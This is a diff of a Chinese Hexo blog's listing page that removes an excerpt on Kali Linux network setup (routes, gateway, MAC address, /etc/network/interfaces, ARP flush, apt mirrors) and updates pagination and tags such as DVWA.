-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/1-1.png" alt="1-1"></p>
-<p>更改网关地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add default gw 192.168.1.1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/1-2.png" alt="1-2"></p>
-<p>更改网络后查看网络情况</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nr</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/1-3.png" alt="1-3"></p>
-<p>更改网络地址后，添加路由信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add -net 172.168.1.0/24 gw 192.168.1.100</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/1-4.png" alt="1-4"></p>
-<p><strong>修改网卡的MAC地址</strong></p>
-<p>先关掉网卡，然后执行下面命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/ifconfig eth0 hw ether (MAC地址)</span><br></pre></td></tr></table></figure>
-<p>再次启动网卡，就可以了，但是下次启动就失效了</p>
-<hr>
-<h2 id="网络配置（永久）"><a href="#网络配置（永久）" class="headerlink" title="网络配置（永久）"></a>网络配置（永久）</h2><p><strong>注意</strong>：以下步骤制定的地址是永久的，需要再次修改配置文件才能恢复</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/network/interface</span><br><span class="line">	auto eth0</span><br><span class="line">	iface eth0 inet static</span><br><span class="line">	address 192.168.20.1</span><br><span class="line">	netmask 255.255.255.0</span><br><span class="line">	network 192.168.20.0</span><br><span class="line">	broadcast 192.168.20.255</span><br><span class="line">	gateway 192.168.20.2</span><br><span class="line">	dns-nameservers 192.168.1.1 192.168.1.2</span><br><span class="line">	up route add -net 172.168.5.0/24 gw 192.168.10.100 eth1</span><br><span class="line">	down route del -net 172.24.0.0/24</span><br></pre></td></tr></table></figure>
-<p>通过修改<strong>/etc/network/interfaces</strong>文件的配置来永久修改网络配置</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/2-1.png" alt="2-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/kali%E7%B3%BB%E7%BB%9F/%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%92%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E6%95%B4/2-1-2.png" alt="2-2"></p>
-<p>清空ARP表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip neigh flush dev eth0</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="系统的更新"><a href="#系统的更新" class="headerlink" title="系统的更新"></a>系统的更新</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">	科技大学更新源</span><br><span class="line">	deb http://mirrors.ustc.edu.cn/kali kali main non-free conrtib</span><br><span class="line">	deb-src http://mirrors.ustc.edu.cn/kalikali main non-free contrib</span><br><span class="line">	deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get dis-upgrade</span><br><span class="line">重复执行</span><br></pre></td></tr></table></figure>
-<p>先执行<strong>apt-get update</strong>，再执行<strong>apt-getupgrade</strong></p>
-<p>apt-get update是更新索引文件，apt-get upgrade是更新安装包</p>
-<p>如果在使用apt-get update的过程中出现了问题，加参数–fix-missing</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Kali系统</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2018/08/01/Kali系统—工具安装和系统调整/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/2/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><span class="page-number current">3</span>
+      <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/2/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/Knlvre.github-io/page/4/">4</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/4/">Next &raquo;</a>
     </nav>
   
 
@@ -1795,6 +1688,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
               </li>
              
               <li class="article-tag-list-item">
